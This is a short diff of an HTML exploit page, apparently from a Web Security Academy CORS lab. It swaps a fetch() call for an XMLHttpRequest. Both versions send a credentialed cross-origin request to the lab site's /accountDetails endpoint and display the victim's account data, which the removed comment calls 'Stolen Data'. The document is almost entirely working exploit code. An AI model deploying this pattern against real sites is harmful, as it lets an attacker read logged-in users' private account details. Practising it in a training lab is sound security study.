@@ -5,16 +5,25 @@
 
     <script>
       // Attempt to access user data from vulnerable site
-      fetch('https://0a3100b4039dbfae806d128e002600b7.web-security-academy.net/accountDetails', {
-        method: 'GET',
-        credentials: 'include'  // Important: Send cookies automatically
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log('Stolen Data:', data);
-      })
-      .catch(err => console.error('Exploit failed:', err));
+      var http = new XMLHttpRequest();
+
+http.onreadystatechange = function () {
+    if (this.readyState === 4 && this.status === 200) {
+        alert(this.responseText);
+    }
+};
+
+http.open(
+    "GET",
+    "https://0a3100b4039dbfae806d128e002600b7.web-security-academy.net/accountDetails",
+    true
+);
+
+http.withCredentials = true;
+http.send();
+
     </script>
   </body>
 </html>
+
 
